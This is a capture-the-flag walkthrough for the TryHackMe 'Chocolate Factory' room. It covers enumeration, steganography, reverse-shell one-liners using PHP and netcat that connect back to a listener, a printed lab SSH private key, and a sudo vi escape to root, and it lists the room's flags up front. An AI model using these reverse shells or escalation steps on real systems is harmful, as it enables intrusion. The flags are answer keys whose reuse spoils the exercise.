
# <div align="center">[Chocolate Factory](https://tryhackme.com/r/room/chocolatefactory)</div>

<div align="center">
	<img src="https://github.com/user-attachments/assets/1db6a365-f65f-43f0-a641-a8b6a5d714f3" ></img>
</div>


## TASK 1. Challenges

### Ques 1. Enter the key you found!
```bash
'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```

### Ques 2. What is Charlie's password?  
```bash
cn7824
```

### Ques 4. Enter the user flag
```bash
flag{cd5509042371b34e4826e4838b522d2e}
```

### Ques 5. Enter the root flag
```bash
flag{cec59161d338fef787fcb4e296b42124}

```


## 1. So Let make a Nmap scan
```bash
┌──(death㉿esther)-[~]
└─$ nmap 10.10.14.239 -sV -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-20 12:59 IST
Nmap scan report for 10.10.14.239
Host is up (0.26s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.3
22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
100/tcp open  newacct?
106/tcp open  pop3pw?
109/tcp open  pop2?
110/tcp open  pop3?
111/tcp open  rpcbind?
113/tcp open  ident?
119/tcp open  nntp?
125/tcp open  locus-map?
```

#### So FTP is open let check with default credential

## 2. Let Check FTP

#### default credentials used to login
```bash
anonymous
```
```bash
┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
└─$ ftp 10.10.14.239
Connected to 10.10.14.239.
220 (vsFTPd 3.0.3)
Name (10.10.14.239:death): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

### Oh we got a image here let get it on our system, Maybe there is some data we can retrive
```bash
                                                                                
┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
└─$ ftp 10.10.14.239
Connected to 10.10.14.239.
220 (vsFTPd 3.0.3)
Name (10.10.14.239:death): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||28984|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.
ftp> get gum_room.jpg
local: gum_room.jpg remote: gum_room.jpg
229 Entering Extended Passive Mode (|||50958|)
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
100% |***********************************|   203 KiB   26.95 KiB/s    00:00 ETA
421 Service not available, remote server has closed connection.
208838 bytes received in 00:08 (23.39 KiB/s)
ftp: No control connection for command
ftp>
```
## 3. Let do steganography 
### I just enter at passphrase, there is no password
```bash
┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
└─$ steghide --extract  -sf gum_room.jpg                        
Enter passphrase: 
wrote extracted data to "b64.txt".
```
### Here is a b64.txt , maybe base 64  , so let convert it directly
```bash
┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
└─$ cat b64.txt| base64 -d
daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```
### Oh so it /etc/passwd , here is the hash. let send it to hashcat 
```bash
──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
└─$ hashcat -m 1800 -a 3 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-1240P, 2752/5568 MB (1024 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Brute-Force
````
### Not able to crack hash using rockyou, let find another way.
## 4. Let do directory search to get more info
```bash
┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
└─$ dirsearch -u 10.10.14.239 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/Lab-CTF/Choclaate_Factory/reports/_10.10.14.239/_24-04-20_19-34-48.txt

Target: http://10.10.14.239/

[19:34:49] Starting: 
[19:34:58] 403 -  277B  - /.ht_wsr.txt
[19:34:58] 403 -  277B  - /.htaccess.bak1
[19:34:58] 403 -  277B  - /.htaccess.sample
[19:34:58] 403 -  277B  - /.htaccess.orig
[19:34:58] 403 -  277B  - /.htaccess_orig
[19:34:58] 403 -  277B  - /.htaccess.save
[19:34:58] 403 -  277B  - /.htaccess_extra
[19:34:58] 403 -  277B  - /.htaccessOLD
[19:34:58] 403 -  277B  - /.htaccessBAK
[19:34:58] 403 -  277B  - /.htaccess_sc
[19:34:58] 403 -  277B  - /.htaccessOLD2
[19:34:58] 403 -  277B  - /.html
[19:34:58] 403 -  277B  - /.htm
[19:34:58] 403 -  277B  - /.htpasswds
[19:34:58] 403 -  277B  - /.htpasswd_test
[19:34:58] 403 -  277B  - /.httr-oauth
[19:35:00] 403 -  277B  - /.php
[19:35:02] 403 -  277B  - /.swp
[19:36:19] 200 -  330B  - /home.php
[19:36:20] 200 -  273B  - /index.php.bak
[19:36:43] 403 -  277B  - /server-status/
[19:36:43] 403 -  277B  - /server-status
[#################   ] 85%   9764/11460        60/s       job:1/1  errors:0Exception in thread Thread-26 (thread_proc):
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/dirsearch/lib/core/fuzzer.py", line 261, in thread_proc
    self.scan(self._base_path + path, scanners)
  File "/usr/lib/python3/dist-packages/dirsearch/lib/core/fuzzer.py", line 168, in scan
    response = self._requester.request(path)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/dirsearch/lib/connection/requester.py", line 222, in request
Exception in thread Thread-14 (thread_proc):
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/dirsearch/lib/core/fuzzer.py", line 261, in thread_proc
    raise RequestException(err_msg)
lib.core.exceptions.RequestException: Request timeout: http://10.10.14.239/sql/sqlweb/

During handling of the above exception, another exception occurred:

```
###  I got some error so but its okay we got page
### Ok so i get two pages let check it out

### So it login page,
![Screenshot from 2024-04-22 11-41-22](https://github.com/Esther7171/ChocolateFactory/assets/122229257/725db937-20c7-4046-9aac-3311a14be287)


### This one is command execution panel.

![Screenshot from 2024-04-22 11-40-45](https://github.com/Esther7171/ChocolateFactory/assets/122229257/1a68d2ad-7b6b-4204-9a87-83e1c71f933f)

### Let try to run some basic commands.

#### By doing ```ls``` we got,
![Screenshot from 2024-04-22 11-42-13](https://github.com/Esther7171/ChocolateFactory/assets/122229257/e0260218-348e-4ea3-bc73-ebd3d62a918f)

### Here is key let to cat
So it in Non readable formate
![Screenshot from 2024-04-22 11-43-20](https://github.com/Esther7171/ChocolateFactory/assets/122229257/b3f71a96-87c8-4492-a082-95cc3a82c53a)


### Let try to strings to read it 
![Screenshot from 2024-04-22 11-43-30](https://github.com/Esther7171/ChocolateFactory/assets/122229257/2949e129-9133-48ad-a588-3c067bca3d9a)


```bash

/lib64/ld-linux-x86-64.so.2 libc.so.6 __isoc99_scanf puts __stack_chk_fail printf __cxa_finalize strcmp __libc_start_main GLIBC_2.7 GLIBC_2.4 GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable 5j %l %j %b %Z %R %J %b =9 AWAVI AUATL []A\A]A^A_ Enter your name: laksdhfas congratulations you have found the key: b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=' Keep its safe Bad name! ;*3$" GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0 crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.7698 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry license.c __FRAME_END__ __init_array_end _DYNAMIC __init_array_start __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_csu_fini _ITM_deregisterTMCloneTable puts@@GLIBC_2.2.5 _edata __stack_chk_fail@@GLIBC_2.4 printf@@GLIBC_2.2.5 __libc_start_main@@GLIBC_2.2.5 __data_start strcmp@@GLIBC_2.2.5 __gmon_start__ __dso_handle _IO_stdin_used __libc_csu_init __bss_start main __isoc99_scanf@@GLIBC_2.7 __TMC_END__ _ITM_registerTMCloneTable __cxa_finalize@@GLIBC_2.2.5 .symtab .strtab .shstrtab .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .data .bss .comment 
```
### here is key in 2 line
```bash
'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```
### Its a base 64 let try to convert it
### No it not as bas64 but look like..

### We got key , Let try to upload a reverse-shell here, so it in php formate let try php shell

## 5. Let uploads
```here are all the reverse-shell```
```bash
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```
### I'm taking this one 
```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
### let open netcat listner and change IP in reverse shell

```bash
┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
└─$ nc -nlvp 1234
```
listening on [any] 1234 ...

### I'm not getting any connection mean that wrong let try to upload a netcat reverse shell
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
### Let try this one, change IP, Let upload it 
![Screenshot from 2024-04-22 11-35-41](https://github.com/Esther7171/ChocolateFactory/assets/122229257/bd40e4d9-6a13-4f25-aada-ff7a9b1cce31)

### Let setup listener !! Here wo got connection
```bash
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.17.120.99] from (UNKNOWN) [10.10.14.239] 35024
/bin/sh: 0: can't access tty; job control turned off
$ 
```
### Let enumerate manually

## Let spawn shell 
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
### We got passoword
```bash
?>www-data@chocolate-factory:/var/www/html$ cat validate.php
cat validate.php
<?php
	$uname=$_POST['uname'];
	$password=$_POST['password'];
	if($uname=="charlie" && $password=="cn7824"){
		echo "<script>window.location='home.php'</script>";
	}
	else{
		echo "<script>alert('Incorrect Credentials');</script>";
		echo "<script>window.location='index.html'</script>";
	}
?>www-data@chocolate-factory:/var/www/html$
```
```bash
$uname=="charlie" && $password=="cn7824
```
### Let go to /homer/charlie
```bash
www-data@chocolate-factory:/var/www/html$ cd /home/charlie && ls -la 
cd /home/charlie && ls -la
total 40
drwxr-xr-x 5 charlie charley 4096 Oct  7  2020 .
drwxr-xr-x 3 root    root    4096 Oct  1  2020 ..
-rw-r--r-- 1 charlie charley 3771 Apr  4  2018 .bashrc
drwx------ 2 charlie charley 4096 Sep  1  2020 .cache
drwx------ 3 charlie charley 4096 Sep  1  2020 .gnupg
drwxrwxr-x 3 charlie charley 4096 Sep 29  2020 .local
-rw-r--r-- 1 charlie charley  807 Apr  4  2018 .profile
-rw-r--r-- 1 charlie charley 1675 Oct  6  2020 teleport
-rw-r--r-- 1 charlie charley  407 Oct  6  2020 teleport.pub
-rw-r----- 1 charlie charley   39 Oct  6  2020 user.txt
www-data@chocolate-factory:/home/charlie$ 
```
### We dont have permission to open user.txt let see other file
### Here is ssh id_rsa
```bash
```bash
www-data@chocolate-factory:/home/charlie$ cat teleport 
cat teleport
```
```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----
```
### Let give it permission 
```bash
┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
└─$ chmod 600 id_rsa            
```
## 6. Let login with Ssh

```bash                                                                                            
┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
└─$ ssh charlie@10.10.14.239 -i id_rsa                    
The authenticity of host '10.10.14.239 (10.10.14.239)' can't be established.
ED25519 key fingerprint is SHA256:WwycVD8zBUVfJS6sNVj192MU3Q7P4rylVnanjGx/Q5U.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.14.239' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Apr 22 06:37:50 UTC 2024

  System load:  0.0               Processes:           608
  Usage of /:   43.6% of 8.79GB   Users logged in:     0
  Memory usage: 61%               IP address for eth0: 10.10.14.239
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Oct  7 16:10:44 2020 from 10.0.2.5
Could not chdir to home directory /home/charley: No such file or directory
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

charlie@chocolate-factory:/$ 
```
### Let cat user.txt
   
```bash
flag{cd5509042371b34e4826e4838b522d2e}
```
## 7. Let escalate privileges
```bash
charlie@chocolate-factory:/home/charlie$ sudo -l 
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
charlie@chocolate-factory:/home/charlie$ 
```
### Ok so let make a visite to gtfobins
```bash
sudo vi -c ':!/bin/sh' /dev/null
```
```bash
charlie@chocolate-factory:/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null

# whoami
root
# 
```
## We got root , Let find flag
### Their is python file
```bash
teleport  teleport.pub	user.txt
# cd /root
# ls
root.py
# 
```
### Let see 
```bash
# cat root.py
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)# 
```
### Maybe we need to enter the key we got at beginning
```bash
# cat root.py
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)# python root.py
Enter the key:  '-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                                                             
  ___                              ___   __  
 / _ \__      ___ __   ___ _ __   / _ \ / _| 
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
                                             

  ____ _                     _       _       
 / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
                                             
 _____          _                    
|  ___|_ _  ___| |_ ___  _ __ _   _  
| |_ / _` |/ __| __/ _ \| '__| | | | 
|  _| (_| | (__| || (_) | |  | |_| | 
|_|  \__,_|\___|\__\___/|_|   \__, | 
                              |___/  

flag{cec59161d338fef787fcb4e296b42124}
#
```
# Done
🙂
